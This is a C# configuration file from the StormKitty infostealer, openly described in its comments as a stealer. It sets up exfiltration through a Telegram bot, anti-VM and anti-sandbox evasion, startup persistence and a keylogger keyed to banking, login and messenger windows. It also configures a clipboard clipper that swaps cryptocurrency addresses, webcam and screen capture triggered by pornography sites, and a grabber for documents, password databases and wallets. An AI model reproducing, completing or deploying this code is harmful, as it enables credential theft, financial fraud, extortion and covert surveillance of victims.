﻿/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using StormKitty.Implant;
using System.Collections.Generic;

namespace StormKitty
{
    internal sealed class Config
    {
        // Stealer version
        public static string Version = "1.5";
        // Debug mode (write all exceptions to file)
        public static string DebugMode = "--- Debug ---";
        // Telegram bot API key
        public static string TelegramAPI = "--- Telegram API ---";
        // Telegram chat ID
        public static string TelegramID = "--- Telegram ID ---";

        // Application mutex (random)
        public static string Mutex = "--- Mutex ---";
        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "--- AntiAnalysis ---";
        // Drop and Hide executable to startup directory
        public static string Autorun = "--- Startup ---";
        // Random start delay (0-10 seconds)
        public static string StartDelay = "--- StartDelay ---";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "--- WebcamScreenshot ---";
        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "--- Keylogger ---";
        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "--- Clipper ---";

        // Clipper addresses:
        public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>() // Адреса для замены
        {
            {"btc", "--- ClipperBTC ---" }, // Bitcoin
            {"eth", "--- ClipperETH ---" }, // Ethereum
            {"xmr", "--- ClipperXMR ---" }, // Monero
            {"xlm", "--- ClipperXLM ---" }, // Stellar
            {"xrp", "--- ClipperXRP ---" }, // Ripple
            {"ltc", "--- ClipperLTC ---" }, // Litecoin
            {"bch", "--- ClipperBCH ---" }, // Bitcoin Cash
        };

        // Start keylogger when active window title contains this text:
        public static string[] KeyloggerServices = new string[]
        {
            "facebook", "twitter",
            "chat", "telegram", "skype", "discord", "viber", "message",
            "gmail", "protonmail", "outlook",
            "password", "encryption", "account", "login", "key", "sign in", "пароль",
            "bank", "банк", "credit", "card", "кредит",
            "shop", "buy", "sell", "купить",
        };
        public static string[] BankingServices = new string[] {
            "qiwi", "money", "exchange",
            "bank",  "credit", "card", "банк", "кредит",
        };
        // Start clipper when active window title contains this text:
        public static string[] CryptoServices = new string[] {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "биткоин", "wallet"
        };
        // Start webcam capture when active window title contains this text:
        public static string[] PornServices = new string[] {
            "porn", "sex", "hentai", "порно", "sex"
        };
        // Social networks
        public static string[] SocialServices = new string[] {
            "facebook", "vk.com", "ok.ru", "instagram", "whatsapp", "twitter", "gmail", "linkedin", "viber", "skype", "reddit", "flickr", "youtube", "pinterest",
        };

        // File grabber:
        public static string GrabberModule = "--- Grabber ---";
        public static int GrabberSizeLimit = 5120; // 5MB
        // Grabber file types:
        public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
        {
            ["Document"] = new string[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" },
            ["DataBase"] = new string[] { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
            ["SourceCode"] = new string[] { "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino" },
            ["Image"] = new string[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" },
        };

        // Decrypt config values
        public static void Init()
        {
            // Decrypt telegram token and telegram chat id
            TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
            TelegramID = StringsCrypt.DecryptConfig(TelegramID);
            // Decrypt clipper addresses
            if (ClipperModule == "1") {
                ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
                ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
                ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(ClipperAddresses["xmr"]);
                ClipperAddresses["xlm"] = StringsCrypt.DecryptConfig(ClipperAddresses["xlm"]);
                ClipperAddresses["xrp"] = StringsCrypt.DecryptConfig(ClipperAddresses["xrp"]);
                ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
                ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(ClipperAddresses["bch"]);
            }
        }

    }
}
